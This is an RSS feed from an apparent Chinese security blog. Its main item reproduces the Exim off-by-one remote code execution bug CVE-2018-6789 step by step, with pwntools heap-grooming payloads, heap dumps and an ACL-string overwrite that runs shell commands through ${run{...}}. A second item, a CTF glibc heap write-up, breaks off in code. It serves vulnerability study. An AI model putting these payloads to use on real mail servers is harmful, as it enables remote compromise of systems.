<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>http://0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Mon, 02 Apr 2018 11:10:27 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Exim Off-by-one(CVE-2018-6789)漏洞复现分析</title>
      <link>http://0x48.pw/2018/03/30/0x42/</link>
      <guid>http://0x48.pw/2018/03/30/0x42/</guid>
      <pubDate>Fri, 30 Mar 2018 06:42:48 GMT</pubDate>
      <description>
      
        &lt;p&gt;前段时间meh又挖了一个Exim的RCE漏洞&lt;a href=&quot;#jump1&quot;&gt;[1]&lt;/a&gt;，而且这次RCE的漏洞的约束更少了，就算开启了PIE仍然能被利用。虽然去年我研究过Exim，但是时间过去这么久了，所以这次复现还是花了大量时间在熟悉Exim源码上。&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>前段时间meh又挖了一个Exim的RCE漏洞<a href="#jump1">[1]</a>，而且这次RCE的漏洞的约束更少了，就算开启了PIE仍然能被利用。虽然去年我研究过Exim，但是时间过去这么久了，所以这次复现还是花了大量时间在熟悉Exim源码上。</p>
<a id="more"></a>
<p>本次漏洞复现的过程中，踩了好多坑，实际复现的过程中发现堆块的实际情况无法像meh所说的那样的构造，所以在这部分卡了很久(猜测是因为环境不同的原因)，之后决定先理解meh利用的大致思路，然后自己根据实际情况对堆块进行构造，虽然过程艰难，但最终基本算是成功了。</p>
<h1 id="复现环境搭建"><a href="#复现环境搭建" class="headerlink" title="复现环境搭建"></a>复现环境搭建</h1><p>本次使用的环境和上次大致相同, 首先去github上该漏洞的patch commit<a href="#jump2">[2]</a></p>
<p>然后把分支切换到上一个commit</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">clone</span> https://github.com/Exim/exim.git</div><div class="line">$ git checkout 38e3d2dff7982736f1e6833e06d4aab4652f337a</div><div class="line">$ <span class="built_in">cd</span> src</div><div class="line">$ mkdir Local</div></pre></td></tr></table></figure>
<p>Makefile仍然使用上次那个:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$ cat Local/makefile | grep -v <span class="string">"#"</span></div><div class="line">BIN_DIRECTORY=/usr/exim/bin</div><div class="line">CONFIGURE_FILE=/usr/exim/configure</div><div class="line">EXIM_USER=ubuntu</div><div class="line">SPOOL_DIRECTORY=/var/spool/exim</div><div class="line">ROUTER_ACCEPT=yes</div><div class="line">ROUTER_DNSLOOKUP=yes</div><div class="line">ROUTER_IPLITERAL=yes</div><div class="line">ROUTER_MANUALROUTE=yes</div><div class="line">ROUTER_QUERYPROGRAM=yes</div><div class="line">ROUTER_REDIRECT=yes</div><div class="line">TRANSPORT_APPENDFILE=yes</div><div class="line">TRANSPORT_AUTOREPLY=yes</div><div class="line">TRANSPORT_PIPE=yes</div><div class="line">TRANSPORT_SMTP=yes</div><div class="line">LOOKUP_DBM=yes</div><div class="line">LOOKUP_LSEARCH=yes</div><div class="line">LOOKUP_DNSDB=yes</div><div class="line">PCRE_CONFIG=yes</div><div class="line">FIXED_NEVER_USERS=root</div><div class="line">AUTH_CRAM_MD5=yes</div><div class="line">AUTH_PLAINTEXT=yes</div><div class="line">AUTH_TLS=yes</div><div class="line">HEADERS_CHARSET=<span class="string">"ISO-8859-1"</span></div><div class="line">SUPPORT_TLS=yes</div><div class="line">TLS_LIBS=-lssl -lcrypto</div><div class="line">SYSLOG_LOG_PID=yes</div><div class="line">EXICYCLOG_MAX=10</div><div class="line">COMPRESS_COMMAND=/usr/bin/gzip</div><div class="line">COMPRESS_SUFFIX=gz</div><div class="line">ZCAT_COMMAND=/usr/bin/zcat</div><div class="line">SYSTEM_ALIASES_FILE=/etc/aliases</div><div class="line">EXIM_TMPDIR=<span class="string">"/tmp"</span></div></pre></td></tr></table></figure>
<p>然后就是编译安装了:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make -j8</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure>
<p>启动也是跟上次一样，但是这里有一个坑点，开启debug，输出所有debug信息，不开debug，这些都堆的布局都会有影响。不过虽然有影响，但是只是影响构造的细节，总体的构造思路还是按照meh写的paper中那样。</p>
<p>本篇的复现，都是基于只输出部分debug信息的模式：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ /usr/exim/bin/exim -bdf -dd</div><div class="line"><span class="comment"># 输出完整debug信息使用的是-bdf -d+all</span></div><div class="line"><span class="comment"># 不开启debug模式使用的是-bdf</span></div></pre></td></tr></table></figure>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>因为我觉得meh的文章中，漏洞原理和相关函数的说明已经很详细，我也没啥要补充的，所以直接写我的复现过程</p>
<h2 id="STEP-1"><a href="#STEP-1" class="headerlink" title="STEP 1"></a>STEP 1</h2><p>首先需要构造一个被释放的chunk，但是没必要像meh文章说的是一个0x6060大小的chunk，只需要满足几个条件:</p>
<p><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/eximrce1.jpeg" alt="eximrce1"></p>
<p>这个chunk要被分为三个部分，一个部分是通过<code>store_get</code>获取，用来存放base64解码的数据，用来造成<code>off by one</code>漏洞，覆盖下一个chunk的size，因为通过<code>store_get</code>获取的chunk最小值是0x2000，然后0x10的堆头和0x10的exim自己实现的堆头，所以是一个至少0x2020的堆块。</p>
<p>第二部分用来放<code>sender_host_name</code>，因为该变量的内存是通过<code>store_malloc</code>获取的，所以没有大小限制</p>
<p>第三部分因为需要构造一个fake chunk用来过free的检查，所以也是一个至少0x2020的堆块</p>
<p>和meh的方法不同，我通过<code>unrecognized command</code>来获取一个0x4041的堆块，然后通过<code>EHLO</code>来释放:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">p.sendline(<span class="string">"\x7f"</span>*<span class="number">4102</span>)</div><div class="line">p.sendline(<span class="string">"EHLO %s"</span>%(<span class="string">"c"</span>*(<span class="number">0x2010</span>)))</div><div class="line"><span class="comment"># heap</span></div><div class="line"><span class="number">0x1d15180</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x0</span>,</div><div class="line">  size = <span class="number">0x4041</span>,</div><div class="line">  fd = <span class="number">0x7f9520917b78</span>,</div><div class="line">  bk = <span class="number">0x1d1b1e0</span>,</div><div class="line">  fd_nextsize = <span class="number">0x0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x0</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d191c0</span> &#123;</div><div class="line">  prev_size = <span class="number">0x4040</span>,</div><div class="line">  size = <span class="number">0x2020</span>,</div><div class="line">  fd = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd_nextsize = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk_nextsize = <span class="number">0x6363636363636363</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>0x1d15180是通过<code>unrecognized command</code>获取的一个0x4040大小的chunk，在执行完<code>EHLO</code>命令后被释放, 然后0x1d191c0是inuse的<code>sender_host_name</code>，这两部分就构成一个0x6060的chunk</p>
<h2 id="STEP-2"><a href="#STEP-2" class="headerlink" title="STEP 2"></a>STEP 2</h2><p>现在的情况是<code>sender_host_name</code>位于0x6060大小chunk的最底部，而我们需要把它移到中间</p>
<p>这部分的思路和meh的一样，首先通过<code>unrecognized command</code>占用顶部0x2020的chunk</p>
<p>之前的文章分析过，<code>unrecognized command</code>申请内存的大小是<code>ss = store_get(length + nonprintcount * 3 + 1);</code></p>
<p>通过计算，只需要让<code>length + nonprintcount * 3 + 1 &gt; yield_length</code>，<code>store_get</code>函数就会从malloc中申请一个chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p.sendline(<span class="string">"\x7f"</span>*<span class="number">0x800</span>)</div></pre></td></tr></table></figure>
<p>这个时候我们就能使用<code>EHLO</code>释放之前的<code>sender_host_name</code>，然后重新设置，让<code>sender_host_name</code>位于0x6060大小chunk的中部</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">p.sendline(&quot;EHLO %s&quot;%(&quot;c&quot;*(0x2000-9)))</div><div class="line"># heap</div><div class="line">0x1d15180 PREV_INUSE &#123;</div><div class="line">  prev_size = 0x0,</div><div class="line">  size = 0x2021,</div><div class="line">  fd = 0x7f9520917b78,</div><div class="line">  bk = 0x1d191a0,</div><div class="line">  fd_nextsize = 0x0,</div><div class="line">  bk_nextsize = 0x0</div><div class="line">&#125;</div><div class="line">0x1d171a0 &#123;</div><div class="line">  prev_size = 0x2020,</div><div class="line">  size = 0x2000,</div><div class="line">  fd = 0x6363636363636363,</div><div class="line">  bk = 0x6363636363636363,</div><div class="line">  fd_nextsize = 0x6363636363636363,</div><div class="line">  bk_nextsize = 0x6363636363636363</div><div class="line">&#125;</div><div class="line">0x1d191a0 PREV_INUSE &#123;</div><div class="line">  prev_size = 0x63636363636363,</div><div class="line">  size = 0x6061,</div><div class="line">  fd = 0x1d15180,</div><div class="line">  bk = 0x7f9520917b78,</div><div class="line">  fd_nextsize = 0x0,</div><div class="line">  bk_nextsize = 0x0</div><div class="line">&#125;</div><div class="line">0x1d1f200 &#123;</div><div class="line">  prev_size = 0x6060,</div><div class="line">  size = 0x2020,</div><div class="line">  fd = 0x1d27380,</div><div class="line">  bk = 0x2008,</div><div class="line">  fd_nextsize = 0x6363636363636328,</div><div class="line">  bk_nextsize = 0x6363636363636363</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="STEP-3"><a href="#STEP-3" class="headerlink" title="STEP 3"></a>STEP 3</h2><p>现在我们的堆布局是：</p>
<ul>
<li>第一块未被使用的0x2020大小的chunk</li>
<li>第二块正在被使用0x2000大小的<code>sender_host_name</code></li>
<li>第三块未被使用，并且和之后堆块合并, 0x6060大小的chunk</li>
</ul>
<p>我们现在再回过头来想想各个chunk的size的设置的问题</p>
<h3 id="CHUNK-1"><a href="#CHUNK-1" class="headerlink" title="CHUNK 1"></a>CHUNK 1</h3><p>第一个chunk是用来触发<code>off by one</code>漏洞，用来修改第二个CHUNK的size位，只能溢出1byte</p>
<p><code>store_get</code>最小分配一个0x2020的chunk，能储存0x2000的数据</p>
<p>这就导致了，如果按照<code>store_get</code>的最小情况来，只能溢出覆盖掉第二个chunk的pre_size位</p>
<p>然后因为<code>(0x2008-1)%3==0</code>，所以我们能通过b64decode函数的漏洞申请一个能储存0x2008的数据，size=0x2020的chunk，然后溢出一个字节到下一个chunk的size位</p>
<h3 id="CHUNK2"><a href="#CHUNK2" class="headerlink" title="CHUNK2"></a>CHUNK2</h3><p>第二块chunk，我们首先需要考虑，因为只能修改一个字节，所以最大只能从0x00扩展到0xf0</p>
<p>其次，我们假设第二块chunk的原始size=0x2021，然后被修改成0x20f1，我们还需要考虑第二块chunk+0x20f1位置的堆块我们是否可控，因为需要伪造一个fake chunk，来bypass free函数的安全检查。</p>
<p>经过多次调试，发现当第二块chunk的size=0x2001时，更方便后续的利用</p>
<h3 id="CHUNK3"><a href="#CHUNK3" class="headerlink" title="CHUNK3"></a>CHUNK3</h3><p>第三个chunk只要求大于一个<code>store_get</code>申请的最小size(0x2020)就行了</p>
<h2 id="STEP-4"><a href="#STEP-4" class="headerlink" title="STEP 4"></a>STEP 4</h2><p>根据第三步叙述的，我们来触发<code>off by one</code>漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">payload1 = <span class="string">"HfHf"</span>*<span class="number">0xaae</span></div><div class="line">p.sendline(<span class="string">"AUTH CRAM-MD5"</span>)</div><div class="line">p.sendline(payload1[:<span class="number">-1</span>])</div><div class="line"><span class="comment"># heap</span></div><div class="line"><span class="number">0x1d15180</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x0</span>,</div><div class="line">  size = <span class="number">0x2021</span>,</div><div class="line">  fd = <span class="number">0x1d191b0</span>,</div><div class="line">  bk = <span class="number">0x2008</span>,</div><div class="line">  fd_nextsize = <span class="number">0xf11ddff11ddff11d</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1ddff11ddff11ddf</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d171a0</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x1ddff11ddff11ddf</span>,</div><div class="line">  size = <span class="number">0x20f1</span>,</div><div class="line">  fd = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd_nextsize = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk_nextsize = <span class="number">0x6363636363636363</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d19290</span> PREV_INUSE IS_MMAPED &#123;</div><div class="line">  prev_size = <span class="number">0x6363636363636363</span>,</div><div class="line">  size = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd_nextsize = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk_nextsize = <span class="number">0x6363636363636363</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>并且构造在第三块chunk中构造一个fake chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0x20f0</span>)+p64(<span class="number">0x1f31</span>)</div><div class="line">p.sendline(<span class="string">"AUTH CRAM-MD5"</span>)</div><div class="line">p.sendline((payload*<span class="number">484</span>).encode(<span class="string">"base64"</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>))</div><div class="line"><span class="comment"># heap</span></div><div class="line"><span class="number">0x1d15180</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x0</span>,</div><div class="line">  size = <span class="number">0x2021</span>,</div><div class="line">  fd = <span class="number">0x1d191b0</span>,</div><div class="line">  bk = <span class="number">0x2008</span>,</div><div class="line">  fd_nextsize = <span class="number">0xf11ddff11ddff11d</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1ddff11ddff11ddf</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d171a0</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x1ddff11ddff11ddf</span>,</div><div class="line">  size = <span class="number">0x20f1</span>,</div><div class="line">  fd = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk = <span class="number">0x6363636363636363</span>,</div><div class="line">  fd_nextsize = <span class="number">0x6363636363636363</span>,</div><div class="line">  bk_nextsize = <span class="number">0x6363636363636363</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d19290</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0xf0</span>,</div><div class="line">  size = <span class="number">0x1f31</span>,</div><div class="line">  fd = <span class="number">0x20f0</span>,</div><div class="line">  bk = <span class="number">0x1f31</span>,</div><div class="line">  fd_nextsize = <span class="number">0x20f0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1f31</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d1b1c0</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x2020</span>,</div><div class="line">  size = <span class="number">0x4041</span>,</div><div class="line">  fd = <span class="number">0x7f9520918288</span>,</div><div class="line">  bk = <span class="number">0x7f9520918288</span>,</div><div class="line">  fd_nextsize = <span class="number">0x1d1b1c0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1d1b1c0</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="STEP-5"><a href="#STEP-5" class="headerlink" title="STEP 5"></a>STEP 5</h2><p>下一步跟meh一样，通过释放<code>sender_host_name</code>，把一个原本0x2000的chunk扩展成0x20f0, 但是却不触发<code>smtp_reset</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">p.sendline(<span class="string">"EHLO a+"</span>)</div><div class="line"><span class="comment"># heap</span></div><div class="line"><span class="number">0x1d171a0</span> PREV_INUSE &#123;</div><div class="line">  prev_size = <span class="number">0x1ddff11ddff11ddf</span>,</div><div class="line">  size = <span class="number">0x20f1</span>,</div><div class="line">  fd = <span class="number">0x1d21240</span>,</div><div class="line">  bk = <span class="number">0x7f9520917b78</span>,</div><div class="line">  fd_nextsize = <span class="number">0x0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x0</span></div><div class="line">&#125;</div><div class="line"><span class="number">0x1d19290</span> &#123;</div><div class="line">  prev_size = <span class="number">0x20f0</span>,</div><div class="line">  size = <span class="number">0x1f30</span>,</div><div class="line">  fd = <span class="number">0x20f0</span>,</div><div class="line">  bk = <span class="number">0x1f31</span>,</div><div class="line">  fd_nextsize = <span class="number">0x20f0</span>,</div><div class="line">  bk_nextsize = <span class="number">0x1f31</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="STEP-6"><a href="#STEP-6" class="headerlink" title="STEP 6"></a>STEP 6</h2><p>meh提供了一种不需要泄露地址就能RCE的思路</p>
<p>exim有一个<code>expand_string</code>函数，当其处理的参数中有<code>${run{xxxxx}}</code>, <code>xxxx</code>则会被当成shell命令执行</p>
<p>而<code>acl_check</code>函数中会对各个命令的配置进行检查，然后把配置信息的字符串调用<code>expand_string</code>函数</p>
<p>我复现环境的配置信息如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/<span class="number">18</span>gx &amp;acl_smtp_vrfy</div><div class="line"><span class="number">0x6ed848</span> &lt;acl_smtp_vrfy&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed858</span> &lt;acl_smtp_rcpt&gt;:	<span class="number">0x0000000001cedac0</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed868</span> &lt;acl_smtp_predata&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed878</span> &lt;acl_smtp_mailauth&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed888</span> &lt;acl_smtp_helo&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed898</span> &lt;acl_smtp_etrn&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed8a8</span> &lt;acl_smtp_data&gt;:	<span class="number">0x0000000001cedad0</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x6ed8b8</span> &lt;acl_smtp_auth&gt;:	<span class="number">0x0000000001cedae0</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure>
<p>所以我有<code>rcpt</code>, <code>data</code>, <code>auth</code>这三个命令可以利用</p>
<p>比如<code>0x0000000001cedae0</code>地址当前的内容是:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/s <span class="number">0x0000000001cedae0</span></div><div class="line"><span class="number">0x1cedae0</span>:	<span class="string">"acl_check_auth"</span></div></pre></td></tr></table></figure>
<p>当我把该字符串修改为<code>${run{/usr/bin/touch /tmp/pwned}}</code></p>
<p>则当我向服务器发送<code>AUTH</code>命令时，exim将会执行<code>/usr/bin/touch /tmp/pwned</code></p>
<p>所以之后就是meh所说的利用链:</p>
<p>修改<code>storeblock</code>的next指针为储存<code>acl_check_xxxx</code>字符串的堆块地址 -&gt; 调用smtp_reset -&gt; 储存<code>acl_check_xxxx</code>字符串的堆块被释放丢入unsortedbin -&gt; 申请堆块，当堆块的地址为储存<code>acl_check_xxxx</code>字符串的堆块时，我们可以覆盖该字符串为命令执行的字符串 -&gt; RCE</p>
<h2 id="STEP-7"><a href="#STEP-7" class="headerlink" title="STEP 7"></a>STEP 7</h2><p>根据上一步所说，我们首先需要修改next指针，第二块chunk的原始大小是0x2000，被修改后新的大小是0x20f0，下一个<code>storeblock</code>的地址为第二块chunk+0x2000，next指针地址为第二块chunk+0x2010</p>
<p>所以我们申请一个0x2020的chunk，就能够覆盖next指针：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p.sendline(<span class="string">"AUTH CRAM-MD5"</span>)</div><div class="line">p.sendline(base64.b64encode(payload*<span class="number">501</span>+p64(<span class="number">0x2021</span>)+p64(<span class="number">0x2021</span>)+p32(address)))</div></pre></td></tr></table></figure>
<p>这里有一个问题</p>
<p>第二个chunk在<code>AUTH CRAM-MD5</code>命令执行时就被分配了，所以<code>b64decode</code>的内存是从<code>next_yield</code>获取的</p>
<p>这样就导致一个问题，我们能通过之前的构造来控制在执行<code>b64decode</code>时<code>yield_length</code>的大小，最开始我的一个思路就是，仍然利用<code>off by one</code>漏洞来修改next，这也是我理解的meh所说的<code>partial write</code></p>
<p>但是实际情况让我这个思路失败了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x1d171a0</span>+<span class="number">0x2000</span></div><div class="line"><span class="number">0x1d191a0</span>:	<span class="number">0x0063636363636363</span>	<span class="number">0x0000000000002021</span></div><div class="line"><span class="number">0x1d191b0</span>:	<span class="number">0x0000000001d171b0</span>	<span class="number">0x0000000000002000</span></div></pre></td></tr></table></figure>
<p>当前的next指针的值为0x1d171b0，如果利用我的思路是可以修改1-2字节，然而储存<code>acl_check_xxx</code>字符的堆块地址为0x1ced980</p>
<p>我们需要修改3字节，所以这个思路行不通</p>
<p>所以又有了另一个思路，因为exim是通过fork起子进程来处理每个socket连接的，所以我们可以爆破堆的基地址，只需要爆破2byte</p>
<h2 id="STEP-8"><a href="#STEP-8" class="headerlink" title="STEP 8"></a>STEP 8</h2><p>在解决地址的问题后，就是对堆进行填充，然后修改相关<code>acl_check_xxx</code>指向的字符串</p>
<p>然后附上利用截图：</p>
<p><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/exim_rce.png" alt="exim_rce"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>坑踩的挺多，尤其是在纠结meh所说的<code>partial write</code>，之后在github上看到别人公布的exp<a href="#jump3">[3]</a>，同样也是使用爆破的方法，所以可能我对<code>partial write</code>的理解有问题吧</p>
<p>另外，通过与github上的exp进行对比，发现不同版本的exim，<code>acl_check_xxx</code>的堆偏移也有差别，所以如果需要RCE exim，需要满足下面的条件：</p>
<ol>
<li>包含漏洞的版本(小于等于commit 38e3d2dff7982736f1e6833e06d4aab4652f337a的版本)</li>
<li>开启CRAM-MD5认证，或者其他有调用b64decode函数的认证</li>
<li>需要有该exim的binary来计算堆偏移</li>
<li>需要知道exim的启动参数</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><span id="jump1"><a href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/" target="_blank" rel="external">https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</a></span></li>
<li><span id="jump2"><a href="https://github.com/Exim/exim/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1" target="_blank" rel="external">https://github.com/Exim/exim/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1</a></span></li>
<li><span id="jump3"><a href="https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789" target="_blank" rel="external">https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789</a></span></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2018/03/30/0x42/#disqus_thread</comments>
    </item>
    
    <item>
      <title>34c3 ctf simpleGC writeup</title>
      <link>http://0x48.pw/2018/01/17/0x40/</link>
      <guid>http://0x48.pw/2018/01/17/0x40/</guid>
      <pubDate>Wed, 17 Jan 2018 09:48:48 GMT</pubDate>
      <description>
      
        &lt;p&gt;一道glibc 2.26堆利用的题目&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>一道glibc 2.26堆利用的题目</p>
<a id="more"></a>
<p>题目链接：<a href="https://github.com/Hcamael/CTF_repo/tree/master/34c3ctf%202017/SimpleGC" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/34c3ctf%202017/SimpleGC</a></p>
<h1 id="部署调试环境"><a href="#部署调试环境" class="headerlink" title="部署调试环境"></a>部署调试环境</h1><p>本题的libc给的是2.26版本的，测试系统用的是ubuntu16.04，libc版本为2.24，得知2.24-2.26在堆管理这块更新了一些机制，所以不能用本地的libc进行测试</p>
<p>这个可以使用：</p>
<ol>
<li>LD_PRELOAD=./libc-2.26.so   来指定libc库</li>
<li>自己编译一份2.26的libc</li>
</ol>
<p>因为目前没发现有使用glibc 2.26的linux系统，所以只有上面两种方法</p>
<h1 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h1><h2 id="sub-40131B函数"><a href="#sub-40131B函数" class="headerlink" title="sub_40131B函数"></a>sub_40131B函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">edit_group()</div><div 